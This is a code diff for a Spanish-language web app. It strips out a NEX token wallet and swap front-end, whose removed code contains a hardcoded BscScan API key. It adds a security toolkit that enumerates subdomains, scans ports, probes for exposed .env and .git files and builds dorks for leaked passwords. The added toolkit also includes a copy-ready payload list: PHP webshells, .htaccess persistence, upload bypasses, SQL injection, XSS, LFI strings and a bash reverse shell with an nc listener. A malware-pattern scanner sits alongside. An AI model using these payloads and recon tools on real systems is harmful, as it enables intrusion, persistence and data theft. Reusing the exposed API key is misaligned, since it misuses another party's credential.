+  const W = ['www','mail','webmail','smtp','ftp','cpanel','whm','ns1','ns2','dev','test','staging','beta','demo','old','backup','admin','panel','dashboard','api','app','cdn','static','assets','files','uploads','blog','shop','store','pay','payments','secure','vpn','remote','git','gitlab','jenkins','db','mysql','redis','phpmyadmin','pma','adminer','monitor','grafana','status','docs','wiki','soporte','help','chat','intranet','portal','sso','auth','login','m','img','media','download'];
+  window.klvBrute = async () => {
+    const d = host(); if (!d) return put('#k-sub','Escribe un dominio.');
+    const q = W.slice(), found = [];
+    put('#k-sub','Resolviendo ' + q.length + ' nombres…');
+    const w = async () => {
+      while (q.length) {
+        const n = q.shift() + '.' + d;
         try {
-          const provider = new ethers.providers.JsonRpcProvider(BSC_RPC_NODES[0]);
-          const factory = new ethers.Contract(PANCAKE_FACTORY_ADDRESS, FACTORY_ABI, provider);
-          const pairAddress = await factory.getPair(TOKEN_CONTRACT_ADDRESS, WBNB_ADDRESS);
-          
-          if (pairAddress && pairAddress !== ethers.constants.AddressZero) {
-            const pairContract = new ethers.Contract(pairAddress, PAIR_ABI, provider);
-            const reserves = await pairContract.getReserves();
-            const token0 = await pairContract.token0();
-            
-            let reserveBNB, reserveToken;
-            if (token0.toLowerCase() === WBNB_ADDRESS.toLowerCase()) {
-              reserveBNB = parseFloat(ethers.utils.formatEther(reserves.reserve0));
-              reserveToken = parseFloat(ethers.utils.formatUnits(reserves.reserve1, 18));
-            } else {
-              reserveBNB = parseFloat(ethers.utils.formatEther(reserves.reserve1));
-              reserveToken = parseFloat(ethers.utils.formatUnits(reserves.reserve0, 18));
-            }
+          const j = await doh(n, 'A');
+          if (j.Answer && j.Answer.length) found.push(n + '  →  ' + j.Answer.map(a => a.data).join(', '));
+        } catch(_){}
+        put('#k-sub', (found.length ? found.join('\n') + '\n\n' : '') + '[' + (W.length - q.length) + '/' + W.length + ']');
+      }
+    };
+    await Promise.all([w(),w(),w(),w(),w(),w(),w(),w()]);
+    put('#k-sub', found.length ? found.join('\n') : 'Nada encontrado.');
+  };
+  window.klvCrt = async () => {
+    const d = host(); if (!d) return put('#k-sub','Escribe un dominio.');
+    put('#k-sub','Consultando certificados…');
+    try {
+      const r = await kf('https://crt.sh/?q=%25.' + encodeURIComponent(d) + '&output=json', 15000);
+      const j = JSON.parse(await r.text());
+      const s = new Set();
+      j.forEach(e => String(e.name_value || '').split('\n').forEach(n => s.add(n.trim())));
+      const l = Array.from(s).filter(Boolean).sort();
+      put('#k-sub', l.length ? l.join('\n') : 'Sin resultados.');
+    } catch (e) { put('#k-sub','Error: ' + e.message + '\nAbre: https://crt.sh/?q=%25.' + d); }
+  };
+  window.klvIp = async () => {
+    const h = host(); if (!h) return put('#k-ip','Escribe un dominio.');
+    put('#k-ip','Resolviendo…');
+    try {
+      const j = await doh(h, 'A');
+      const ips = (j.Answer || []).map(a => a.data);
+      if (!ips.length) return put('#k-ip','Sin registros A.');
+      let t = 'IPs: ' + ips.join(', ') + '\n\n';
+      try {
+        const g = await (await fetch('https://ipwho.is/' + ips[0])).json();
+        if (g.success !== false) t += [g.country, g.region, g.city].filter(Boolean).join(' / ') + '\nASN: ' + (g.connection && g.connection.asn) + ' ' + ((g.connection && g.connection.isp) || '');
+      } catch(_){ t += 'Sin geodatos.'; }
+      put('#k-ip', t);
+    } catch (e) { put('#k-ip','Error: ' + e.message); }
+  };
+  window.klvHead = async () => {
+    const h = host(); if (!h) return put('#k-head','Escribe un dominio.');
+    put('#k-head','Pidiendo…');
+    try {
+      const r = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://' + h));
+      const j = await r.json();
+      const s = j.status || {};
+      put('#k-head', 'HTTP ' + s.http_code + '\nContent-Type: ' + s.content_type + '\nLongitud: ' + s.content_length + '\nTiempo: ' + s.response_time + ' ms\nURL final: ' + s.url + '\n\nTamaño del cuerpo: ' + String(j.contents || '').length + ' car.');
+    } catch (e) { put('#k-head','Error: ' + e.message); }
+  };
+  window.klvHeadLink = () => { const h = host(); if (h) window.open('https://securityheaders.com/?q=https://' + h, '_blank'); };
+  window.klvDorks = () => {
+    const d = host() || 'dominio.com';
+    put('#k-dork', ['site:' + d + ' ext:php','site:' + d + ' inurl:admin','site:' + d + ' inurl:login','site:' + d + ' intitle:"index of"','site:' + d + ' ext:sql OR ext:bak OR ext:old','site:' + d + ' inurl:.git','site:' + d + ' inurl:upload','site:' + d + ' "phpinfo()"','site:' + d + ' intext:"Warning: mysql"','site:' + d + ' ext:env OR ext:json "password"','site:pastebin.com "' + d + '"','site:github.com "' + d + '"'].join('\n'));
+  };
 
-            if (reserveToken > 0 && reserveBNB > 0) {
-              const bnbPerToken = reserveBNB / reserveToken;
-              window.PRECIO_TOKEN_USD = bnbPerToken * window.PRECIO_BNB_USD;
-            }
-          }
-        } catch (e) {}
+  const R = {
+    crit: [[/\beval\s*\(/i,'eval() — ejecución arbitraria'],[/\bassert\s*\(\s*[$'"]/i,'assert() con cadena'],[/\b(preg_replace|create_function)\s*\(.*['"]\/[a-z]*e[a-z]*['"]/i,'preg_replace /e'],[/__halt_compiler\s*\(/i,'webshell empaquetada'],[/AddType\s+application\/x-httpd-php/i,'.htaccess fuerza PHP'],[/SetHandler\s+.*php/i,'SetHandler PHP'],[/auto_prepend_file/i,'auto_prepend_file'],[/<FilesMatch[^>]*\.(jpg|png|gif)/i,'imágenes ejecutadas como PHP']],
+    high: [[/\b(system|exec|shell_exec|passthru|popen|proc_open)\s*\(/i,'comandos de sistema'],[/(gzinflate|gzuncompress|str_rot13|strrev)\s*\(/i,'ofuscación/descompresión'],[/\b(include|require)(_once)?\s*\(?\s*\$_(GET|POST|REQUEST|COOKIE)/i,'inclusión desde entrada'],[/\b(include|require)(_once)?\s*\(?\s*\$[a-z_]/i,'inclusión con variable'],[/new\s+Function\s*\(/i,'new Function'],[/pickle\.loads\s*\(/i,'pickle.loads'],[/(subprocess|os\.system|os\.popen)/i,'ejecución en Python'],[/\$_REQUEST\b/,'$_REQUEST'],[/\b(fsockopen|stream_socket_client|curl_exec)\s*\(/i,'conexión saliente'],[/\b(move_uploaded_file|file_put_contents)\s*\(/i,'escritura de archivos'],[/base64_decode\s*\(/i,'base64_decode'],[/AKIA[0-9A-Z]{16}/,'clave AWS'],[/-----BEGIN [A-Z ]*PRIVATE KEY-----/,'clave privada'],[/eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\./,'token JWT']],
+    med: [[/\bunserialize\s*\(/i,'unserialize'],[/\bmd5\s*\(|\bsha1\s*\(/i,'hash débil'],[/\$_(GET|POST|REQUEST|COOKIE)\s*\[/i,'superglobal directa'],[/innerHTML\s*=/i,'innerHTML'],[/atob\s*\(|String\.fromCharCode|unescape\s*\(/i,'decodificación JS'],[/\bchr\s*\(\s*\d+/i,'construcción por chr()'],[/\\x[0-9a-f]{2}\\x[0-9a-f]{2}/i,'cadena hex escapada'],[/chmod\s*\(|0777/,'permisos'],[/\bmail\s*\(/i,'mail()'],[/\$_SERVER\s*\[\s*['"]HTTP_/i,'cabecera controlable'],[/document\.write\s*\(/i,'document.write']],
+    low: [[/document\.cookie/i,'cookies'],[/localStorage|sessionStorage/i,'almacenamiento'],[/console\.log/i,'logs'],[/<!--/,'comentario HTML']]
+  };
+  const sevOf = new Map();
+  ['crit','high','med','low'].forEach(s => R[s].forEach(r => sevOf.set(r, s)));
 
-        if (document.getElementById('tokenPrice')) {
-          document.getElementById('tokenPrice').innerText = `$${window.formatearMoneda(window.PRECIO_TOKEN_USD)} USD`;
-        }
-        window.recalcularBalanceUsuario();
-        window.calcularRecepcionNEX();
-      };
+  window.klvLoadFile = e => {
+    const f = e.target.files[0]; if (!f) return;
+    const r = new FileReader();
+    r.onload = () => { $('#k-code').value = r.result; };
+    r.readAsText(f);
+    const n = f.name.toLowerCase();
+    if (n.endsWith('.htaccess') || n === '.htaccess') $('#k-lang').value = 'htaccess';
+    else if (n.endsWith('.js')) $('#k-lang').value = 'js';
+    else if (n.endsWith('.py')) $('#k-lang').value = 'py';
+    else if (n.endsWith('.php')) $('#k-lang').value = 'php';
+  };
+  window.klvClear = () => {
+    $('#k-code').value = '';
+    ['#k-repcard','#k-findcard','#k-ioccard','#k-deccard'].forEach(s => { const e=$(s); if(e) e.style.display='none'; });
+  };
+  window.klvAnalyze = async () => {
+    const src = $('#k-code').value;
+    if (!src.trim()) return;
+    const lang = $('#k-lang').value;
+    const lines = src.split('\n');
+    let rules;
+    if (lang === 'php') rules = R.crit.concat(R.high, R.med, R.low);
+    else if (lang === 'js') rules = R.high.concat(R.med, R.low);
+    else if (lang === 'py') rules = R.crit.filter(r => /exec|eval|pickle|subprocess/i.test(r[1])).concat(R.high, R.med);
+    else if (lang === 'htaccess') rules = R.crit.filter(r => /htaccess|Handler|prepend|FilesMatch/i.test(r[1]));
+    else rules = R.crit.concat(R.high, R.med, R.low);
 
-      window.cargarHistorialOnChainReal = async function(address) {
-        const lista = document.getElementById('historialLista');
-        if (!address) return;
+    const f = [];
+    lines.forEach((l, i) => {
+      if (l.length > 4000) return;
+      rules.forEach(r => { if (r[0].test(l)) f.push({ l: i+1, s: sevOf.get(r)||'med', m: r[1], x: l.trim().slice(0,200) }); });
+    });
+    const br = /[A-Za-z0-9+/]{120,}={0,2}/g; let m;
+    while ((m = br.exec(src)) !== null) {
+      f.push({ l: src.slice(0, m.index).split('\n').length, s:'high', m:'bloque base64 de ' + m[0].length + ' caracteres', x: m[0].slice(0,110) + '…' });
+    }
+    const c = { crit:0, high:0, med:0, low:0 };
+    f.forEach(x => c[x.s]++);
+    const sc = Math.min(100, c.crit*25 + c.high*12 + c.med*5 + c.low*1);
 
-        try {
-          lista.innerHTML = '<p style="color:var(--text-muted);text-align:center;">Cargando transacciones...</p>';
-          const url = `https://api.bscscan.com/api?module=account&action=tokentx&contractaddress=${TOKEN_CONTRACT_ADDRESS}&address=${address}&page=1&offset=25&sort=desc&apikey=YHQ8E3F2X85FUDZ5XZS4H1B45476R24XV6`;
-          const res = await fetch(url);
-          const data = await res.json();
+    $('#k-repcard').style.display = 'block';
+    $('#k-findcard').style.display = 'block';
+    $('#k-score').textContent = sc;
+    $('#k-score').style.color = sc >= 60 ? '#ff4d5e' : sc >= 25 ? '#ffc857' : '#39ff88';
+    $('#k-verdict').textContent = sc >= 60 ? 'RIESGO ALTO — revisar cada crítico' : sc >= 25 ? 'REVISAR — hay ofuscación o ejecución dinámica' : 'BAJO — patrones normales';
+    $('#k-lines').textContent = lines.length;
+    $('#k-crit').textContent = c.crit; $('#k-high').textContent = c.high; $('#k-med').textContent = c.med;
+    try {
+      const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(src));
+      $('#k-hash').textContent = Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2,'0')).join('').slice(0,24) + '…';
+    } catch(_){ $('#k-hash').textContent = 'n/d'; }
 
-          if (data.status === "1" && data.result && data.result.length > 0) {
-            lista.innerHTML = '';
+    const ord = { crit:0, high:1, med:2, low:3 };
+    f.sort((a,b) => ord[a.s]-ord[b.s] || a.l-b.l);
+    const box = $('#k-findings'); box.innerHTML = '';
+    if (!f.length) box.innerHTML = '<p class="klv-hint">Sin coincidencias.</p>';
+    f.slice(0,200).forEach(x => {
+      const d = document.createElement('div');
+      d.className = 'klv-f';
+      d.innerHTML = '<span class="ln">' + x.l + '</span><span class="klv-tag t' + x.s[0] + '">' + x.s.toUpperCase() + '</span><div class="ms">' + esc(x.m) + '<code>' + esc(x.x) + '</code></div>';
+      box.appendChild(d);
+    });
 
-            data.result.forEach(tx => {
-              const esRecibido = tx.to.toLowerCase() === address.toLowerCase();
-              const cantidad = parseFloat(ethers.utils.formatUnits(tx.value, parseInt(tx.tokenDecimal || 18))).toFixed(2);
-              const fecha = new Date(parseInt(tx.timeStamp) * 1000).toLocaleString();
-              const txHash = tx.hash;
+    const g = re => Array.from(new Set(src.match(re) || [])).slice(0,50);
+    const urls = g(/https?:\/\/[^\s"'<>)\]]+/g), ips = g(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g);
+    const doms = g(/\b(?:[a-z0-9-]+\.)+(?:com|net|org|io|ru|cn|xyz|top|info|shop|online|tk|ml|ga|cf|gq|onion|app)\b/gi);
+    const mails = g(/[\w.+-]+@[\w-]+\.[\w.]{2,}/g);
+    if (urls.length + ips.length + doms.length + mails.length) {
+      $('#k-ioccard').style.display = 'block';
+      put('#k-iocs', [urls.length?'URLs:\n'+urls.join('\n'):'', ips.length?'IPs:\n'+ips.join('\n'):'', doms.length?'Dominios:\n'+doms.join('\n'):'', mails.length?'Emails:\n'+mails.join('\n'):''].filter(Boolean).join('\n\n'));
+    } else $('#k-ioccard').style.display = 'none';
 
-              let textoTipo = "RECIBIDO";
-              let tipoClase = "tipo-compra";
-              let signo = "+";
+    const dec = [];
+    (src.match(/[A-Za-z0-9+/]{60,}={0,2}/g) || []).slice(0,5).forEach(b => {
+      try {
+        const t = decodeURIComponent(escape(atob(b)));
+        if (/[\x20-\x7e]{20,}/.test(t)) dec.push('--- ' + b.slice(0,36) + '…\n' + t.slice(0,800));
+      } catch(_){}
+    });
+    if (dec.length) { $('#k-deccard').style.display = 'block'; put('#k-dec', dec.join('\n\n')); }
+    else $('#k-deccard').style.display = 'none';
+  };
 
-              if (esRecibido) {
-                  textoTipo = "RECIBIDO";
-                  tipoClase = "tipo-compra";
-              } else {
-                  textoTipo = "ENVIADO";
-                  tipoClase = "tipo-envio";
-                  signo = "-";
-              }
+  const COMMON = '21,22,23,25,53,80,110,143,443,445,1433,2082,2083,3000,3306,3389,5432,6379,8000,8080,8443,8888,9000,27017';
+  window.klvCommon = () => { $('#k-ports').value = COMMON; };
+  window.klvScan = async () => {
+    const h = ($('#k-host').value || host()).trim();
+    const ps = $('#k-ports').value.split(',').map(p => p.trim()).filter(Boolean);
+    if (!h) return put('#k-scan','Indica host.');
+    put('#k-scan','Probando ' + ps.length + ' puertos…');
+    const res = [];
+    for (const p of ps) {
+      try {
+        const r = await kf('http://' + h + ':' + p + '/', 5000);
+        res.push('[+] ' + p + '  HTTP ' + r.status);
+      } catch(_) { res.push('[-] ' + p); }
+      put('#k-scan', res.join('\n'));
+    }
+    put('#k-scan', res.join('\n') + '\n\nResponden: ' + res.filter(x => x.startsWith('[+]')).length);
+  };
+  const PATHS = ['/robots.txt','/sitemap.xml','/.git/HEAD','/.env','/.htaccess','/backup.zip','/admin/','/administrator/','/phpmyadmin/','/server-status','/phpinfo.php','/api/','/.well-known/security.txt'];
+  window.klvPaths = async () => {
+    const h = host(); if (!h) return put('#k-paths','Escribe un dominio.');
+    put('#k-paths','Sondeando…');
+    const out = [];
+    for (const p of PATHS) {
+      try {
+        const r = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://' + h + p));
+        const j = await r.json();
+        const code = (j.status && j.status.http_code) || '?';
+        out.push(code + '  ' + p + (String(code) === '200' ? '   <==' : ''));
+      } catch(_) { out.push('ERR ' + p); }
+      put('#k-paths', out.join('\n'));
+    }
+  };
 
-              const d = document.createElement('div');
-              d.className = 'historial-item';
+  window.klvCd = op => {
+    const v = $('#k-cd').value; let r = '';
+    try {
+      if (op==='b64e') r = btoa(unescape(encodeURIComponent(v)));
+      if (op==='b64d') r = decodeURIComponent(escape(atob(v.trim())));
+      if (op==='hexe') r = Array.from(new TextEncoder().encode(v)).map(b => b.toString(16).padStart(2,'0')).join('');
+      if (op==='hexd') r = (v.trim().replace(/[^0-9a-f]/gi,'').match(/.{2}/g) || []).map(x => String.fromCharCode(parseInt(x,16))).join('');
+      if (op==='urle') r = encodeURIComponent(v);
+      if (op==='urld') r = decodeURIComponent(v);
+      if (op==='rot13') r = v.replace(/[a-z]/gi, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0)+13) ? c : c-26));
+      if (op==='rev') r = Array.from(v).reverse().join('');
+    } catch (e) { r = 'Error: ' + e.message; }
+    put('#k-cdout', r);
+  };
+  window.klvHash = async () => {
+    try {
+      const b = await crypto.subtle.digest($('#k-halg').value, new TextEncoder().encode($('#k-hin').value));
+      put('#k-hout', Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2,'0')).join(''));
+    } catch (e) { put('#k-hout','Error: ' + e.message); }
+  };
+  window.klvJwt = () => {
+    const t = $('#k-jwt').value.trim().split('.');
+    if (t.length < 2) return put('#k-jwtout','No parece un JWT.');
+    const d = s => { try { return JSON.stringify(JSON.parse(decodeURIComponent(escape(atob(s.replace(/-/g,'+').replace(/_/g,'/'))))), null, 2); } catch(_){ return '(ilegible)'; } };
+    const h = JSON.parse(d(t[0]) || '{}');
+    let w = '';
+    if (h.alg === 'none') w = '\n\n⚠ alg:none — sin firma, falseable.';
+    put('#k-jwtout', 'HEADER\n' + d(t[0]) + '\n\nPAYLOAD\n' + d(t[1]) + '\n\nFIRMA\n' + (t[2] || '(ninguna)') + w);
+  };
 
-              d.innerHTML = `
-                <div>
-                  <span class="historial-tipo ${tipoClase}">${textoTipo}</span>
-                  <div style="font-size:11px;color:var(--text-muted);">${fecha}</div>
-                  <a href="https://bscscan.com/tx/${txHash}" target="_blank" style="font-size:10px; color:var(--primary-cyan); text-decoration:none;">Ver en BscScan ↗️</a>
-                </div>
-                <div style="font-weight:bold; color: ${esRecibido ? 'var(--green-up)' : 'var(--red-down)'};">
-                  ${signo}${cantidad} NEX
-                </div>
-              `;
-              lista.appendChild(d);
-            });
-          } else {
-            lista.innerHTML = '<p style="color:var(--text-muted);text-align:center;">No se encontraron transacciones recientes de NEX en esta billetera.</p>';
-          }
-        } catch (err) {
-          console.error("Error historial:", err);
-          lista.innerHTML = '<p style="color:var(--red-down);text-align:center;">Error al conectar con el explorador BSCScan. Inténtalo más tarde.</p>';
-        }
-      };
+  const P = [
+    ['PHP — webshell mínima', "<?php echo shell_exec($_GET['c']); ?>"],
+    ['PHP — webshell POST', "<?php @eval($_POST['x']); ?>"],
+    ['PHP — sin funciones evidentes', "<?php $a='sys'.'tem'; $a($_GET['c']); ?>"],
+    ['PHP — empaquetada base64', "<?php eval(base64_decode('BASE64_AQUI')); ?>"],
+    ['PHP — subir archivo', "<?php move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); ?>"],
+    ['.user.ini — persistencia', "auto_prepend_file=/home/user/public_html/shell.php"],
+    ['.htaccess — PHP en imágenes', "AddType application/x-httpd-php .jpg .png .gif"],
+    ['.htaccess — hook global', "php_value auto_prepend_file /full/path/shell.php"],
+    ['Bypass de upload', "shell.php.jpg\nshell.php%00.jpg\nshell.pHp\nshell.php.  (espacio final)\nshell.php;.jpg"],
+    ['SQLi — básicos', "' OR '1'='1\n' OR 1=1-- -\n' UNION SELECT NULL,NULL-- -\nadmin'-- -"],
+    ['SQLi — ciego por tiempo', "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -"],
+    ['XSS — pruebas', "<script>alert(1)<\/script>\n\"><img src=x onerror=alert(1)>\njavascript:alert(1)"],
+    ['LFI — rutas', "../../../../etc/passwd\n....//....//etc/passwd\nphp://filter/convert.base64-encode/resource=index.php"],
+    ['Comandos — separadores', ";\n&&\n||\n`id`\n$(id)\n%0aid"],
+    ['Reverse shell — bash', "bash -i >& /dev/tcp/IP/PUERTO 0>&1"],
+    ['Listener', "nc -lvnp PUERTO"],
+    ['Buscar puertas traseras en servidor', "grep -rnE \"eval\\(|base64_decode|shell_exec|assert\\(\" ./ --include=*.php\nfind . -name '*.php' -newermt '2025-01-01'\ngrep -rn \"auto_prepend_file\" ./"],
+    ['WordPress — revisar infección', "wp core verify-checksums\nwp plugin list --status=active\ngrep -rn \"eval(base64\" wp-content/"],
+    ['Headers por curl', "curl -sI https://dominio.com"]
+  ];
+  const pl = $('#k-paylist');
+  P.forEach(function(it){
+    const d = document.createElement('details'); d.className = 'klv-pay';
+    const s = document.createElement('summary'); s.textContent = it[0];
+    const pre = document.createElement('pre'); pre.textContent = it[1];
+    const b = document.createElement('button'); b.className = 'klv-b g'; b.textContent = 'COPIAR';
+    b.style.margin = '0 11px 11px';
+    b.onclick = function(e){ e.preventDefault(); navigator.clipboard.writeText(it[1]); b.textContent = 'COPIADO'; setTimeout(() => b.textContent = 'COPIAR', 1200); };
+    d.appendChild(s); d.appendChild(pre); d.appendChild(b); pl.appendChild(d);
+  });
 
-      window.recalcularBalanceUsuario = function() { 
-        const profitElem = document.getElementById('userProfit');
-
-        if (profitElem) {
-            const signo = window.CAMBIO_24H_PORCENTAJE >= 0 ? '+' : '';
-            profitElem.innerText = `${signo}${window.CAMBIO_24H_PORCENTAJE.toFixed(2)}%`;
-            profitElem.style.color = window.CAMBIO_24H_PORCENTAJE >= 0 ? 'var(--green-up)' : 'var(--red-down)';
-        }
-      };
-
-      window.asegurarRedBNB = async function() {
-        if (typeof window.ethereum !== 'undefined') {
-          try {
-            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-          } catch (switchError) {
-            if (switchError.code === 4902) {
-              try {
-                await window.ethereum.request({
-                  method: 'wallet_addEthereumChain',
-                  params: [{
-                    chainId: '0x38',
-                    chainName: 'BNB Smart Chain Mainnet',
-                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                    rpcUrls: BSC_RPC_NODES,
-                    blockExplorerUrls: ['https://bscscan.com/']
-                  }]
-                });
-              } catch (addError) {}
-            }
-          }
-        }
-      };
-
-      window.actualizarSaldosSwap = async function() {
-          const balanceElem = document.getElementById('swapUserBalance');
-          if (!window.walletDireccionConectada || typeof window.ethereum === 'undefined') {
-              balanceElem.innerText = 'Saldo: 0.00';
-              return;
-          }
-          
-          const currency = document.getElementById('swapCurrency').value;
-          balanceElem.innerText = 'Cargando saldo...';
-          
-          try {
-              await window.asegurarRedBNB();
-              const provider = new ethers.providers.Web3Provider(window.ethereum);
-              if (currency === 'BNB') {
-                  const balanceWei = await provider.getBalance(window.walletDireccionConectada);
-                  const balanceBnb = parseFloat(ethers.utils.formatEther(balanceWei));
-                  balanceElem.innerText = `Saldo: ${balanceBnb.toFixed(4)} BNB`;
-              } else {
-                  const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, provider);
-                  const balanceWei = await usdtContract.balanceOf(window.walletDireccionConectada);
-                  const balanceUsdt = parseFloat(ethers.utils.formatUnits(balanceWei, 18));
-                  balanceElem.innerText = `Saldo: ${balanceUsdt.toFixed(2)} USDT`;
-              }
-          } catch (error) {
-              balanceElem.innerText = 'Saldo: Error';
-              console.error("Error al cargar saldo:", error);
-          }
-      };
-
-      window.calcularRecepcionNEX = function() {
-          const amountStr = document.getElementById('swapAmountIn').value.trim();
-          const outElem = document.getElementById('swapExpectedOut');
-          const amount = parseFloat(amountStr);
-          
-          if (isNaN(amount) || amount <= 0 || window.PRECIO_TOKEN_USD <= 0) {
-              outElem.innerText = `Recibirás aprox: 0.00 NEX`;
-              return;
-          }
-
-          const currency = document.getElementById('swapCurrency').value;
-          let nexAmount = 0;
-          
-          if (currency === 'BNB') {
-              nexAmount = (amount * window.PRECIO_BNB_USD) / window.PRECIO_TOKEN_USD;
-          } else {
-              nexAmount = amount / window.PRECIO_TOKEN_USD;
-          }
-          
-          outElem.innerText = `Recibirás aprox: ${window.formatearMoneda(nexAmount, 2)} NEX`;
-      };
-
-      window.ejecutarSwapWeb3 = async function() {
-        const currency = document.getElementById('swapCurrency').value;
-        const amountInStr = document.getElementById('swapAmountIn').value.trim();
-        const amountIn = parseFloat(amountInStr);
-
-        if (!amountInStr || isNaN(amountIn) || amountIn <= 0) {
-            return alert("Ingresa una cantidad válida.");
-        }
-
-        if (typeof window.ethereum === 'undefined') {
-            return alert("Abre esta página desde tu billetera (MetaMask o Trust Wallet).");
-        }
-
-        try {
-            await window.asegurarRedBNB();
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            const signer = provider.getSigner();
-            const walletUser = await signer.getAddress();
-            
-            const balanceWei = await provider.getBalance(walletUser);
-            const balanceBnb = parseFloat(ethers.utils.formatEther(balanceWei));
-
-            if (currency === 'BNB') {
-                if (balanceBnb < (amountIn + 0.0005)) {
-                    return alert("Saldo insuficiente. No tienes suficiente BNB en tu billetera para pagar esta cantidad más la comisión de red. Recarga BNB para evitar errores.");
-                }
-            } else if (currency === 'USDT') {
-                if (balanceBnb < 0.0005) {
-                    return alert("Necesitas al menos un poco de BNB (aprox. 0.0005) para pagar la comisión de gas de la transacción, aunque pagues con USDT.");
-                }
-                const usdtContractTest = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, provider);
-                const usdtBal = await usdtContractTest.balanceOf(walletUser);
-                if (parseFloat(ethers.utils.formatUnits(usdtBal, 18)) < amountIn) {
-                    return alert("No tienes suficiente saldo de USDT para realizar esta compra.");
-                }
-            }
-
-            const routerContract = new ethers.Contract(PANCAKE_ROUTER_ADDRESS, ROUTER_ABI, signer);
-            const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
-            
-            if (currency === 'BNB') {
-                const amountInWei = ethers.utils.parseEther(amountInStr);
-                const path = [WBNB_ADDRESS, TOKEN_CONTRACT_ADDRESS];
-                
-                alert("Confirma la transacción en tu billetera para comprar con BNB...");
-                const tx = await routerContract.swapExactETHForTokens(
-                    0, 
-                    path,
-                    walletUser,
-                    deadline,
-                    { value: amountInWei }
-                );
-                alert("Procesando compra en la cadena BNB Smart Chain...");
-                await tx.wait();
-                alert("¡Compra completada exitosamente!");
-                
-            } else if (currency === 'USDT') {
-                const amountInWei = ethers.utils.parseUnits(amountInStr, 18);
-                const path = [USDT_BSC_ADDRESS, TOKEN_CONTRACT_ADDRESS];
-                
-                const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
-                
-                alert("Paso 1: Confirma la aprobación de USDT en tu billetera...");
-                const txApprove = await usdtContract.approve(PANCAKE_ROUTER_ADDRESS, amountInWei);
-                await txApprove.wait();
-                
-                alert("Paso 2: Ahora, confirma el intercambio (Swap) en tu billetera...");
-                const txSwap = await routerContract.swapExactTokensForTokens(
-                    amountInWei,
-                    0, 
-                    path,
-                    walletUser,
-                    deadline
-                );
-                alert("Procesando compra en la cadena BNB Smart Chain...");
-                await txSwap.wait();
-                alert("¡Compra completada exitosamente!");
-            }
-
-            window.cerrarModal('modalCanjear');
-            document.getElementById('swapAmountIn').value = '';
-            window.consultarSaldoOnChain(walletUser);
-
-        } catch (error) {
-            console.error("Error en canje:", error);
-            alert("No se pudo completar el canje: " + (error.reason || error.message || "La transacción fue cancelada o hubo un error."));
-        }
-      };
-
-      window.ejecutarEnvioTokensWeb3 = async function() {
-        const destino = document.getElementById('sendDestinationAddress').value.trim();
-        const cantidadStr = document.getElementById('sendTokenAmount').value.trim();
-        const cantidad = parseFloat(cantidadStr);
-
-        if (!destino || !ethers.utils.isAddress(destino)) {
-            return alert("Ingresa una dirección de destino válida (0x...).");
-        }
-
-        if (!cantidadStr || isNaN(cantidad) || cantidad <= 0) {
-            return alert("Ingresa una cantidad válida de tokens a enviar.");
-        }
-
-        if (typeof window.ethereum === 'undefined') {
-            return alert("Abre esta página desde tu billetera (MetaMask o Trust Wallet).");
-        }
-
-        try {
-            await window.asegurarRedBNB();
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            const signer = provider.getSigner();
-            const walletUser = await signer.getAddress();
-
-            const contract = new ethers.Contract(TOKEN_CONTRACT_ADDRESS, ERC20_ABI, signer);
-            const parsedAmount = ethers.utils.parseUnits(cantidadStr, 18);
-
-            alert("Confirma el envío en tu billetera...");
-            const tx = await contract.transfer(destino, parsedAmount);
-            alert("Procesando envío en la cadena BNB Smart Chain...");
-            await tx.wait();
-
-            alert("¡Envío completado exitosamente!");
-            window.cerrarModal('sendTokensModal');
-            document.getElementById('sendDestinationAddress').value = '';
-            document.getElementById('sendTokenAmount').value = '';
-            window.consultarSaldoOnChain(walletUser);
-
-        } catch (error) {
-            console.error("Error en envío:", error);
-            alert("No se pudo completar el envío: " + (error.reason || error.message || "Error RPC o firma cancelada."));
-        }
-      };
-
-      window.consultarSaldoOnChain = async function(address) {
-        if (!address) return;
-        try {
-          window.walletDireccionConectada = ethers.utils.getAddress(address);
-          
-          let provider;
-          if (typeof window.ethereum !== 'undefined') {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-          } else {
-            provider = new ethers.providers.JsonRpcProvider(BSC_RPC_NODES[0]);
-          }
-
-          const contract = new ethers.Contract(TOKEN_CONTRACT_ADDRESS, ERC20_ABI, provider);
-          const rawBalance = await contract.balanceOf(window.walletDireccionConectada);
-          const formattedBalance = parseFloat(ethers.utils.formatUnits(rawBalance, 18));
-          
-          window.tokensActualesUsuario = formattedBalance;
-          document.getElementById('userTokens').innerText = window.formatearMoneda(formattedBalance) + ' NEX';
-          document.getElementById('walletWarningBanner').style.display = 'none';
-          document.getElementById('userDisplay').innerText = window.walletDireccionConectada.substring(0, 6) + "..." + window.walletDireccionConectada.substring(38);
-          
-          window.recalcularBalanceUsuario();
-          window.cargarHistorialOnChainReal(window.walletDireccionConectada);
-        } catch (error) {
-            console.error("Error al consultar saldo:", error);
-        }
-      };
-
-      onAuthStateChanged(auth, async (user) => {
-        if (user) {
-          window.usuarioActual = user;
-          
-          onSnapshot(doc(db, "usuarios", user.uid), (uSnap) => {
-              if (uSnap.exists() && uSnap.data().banned === true) {
-                  document.getElementById('bannedScreen').style.display = 'flex';
-                  return;
-              } else {
-                  document.getElementById('bannedScreen').style.display = 'none';
-              }
-          });
-
-          localStorage.setItem("nex_sesion_activa", "true");
-          document.getElementById('welcomeSection').style.display = 'none';
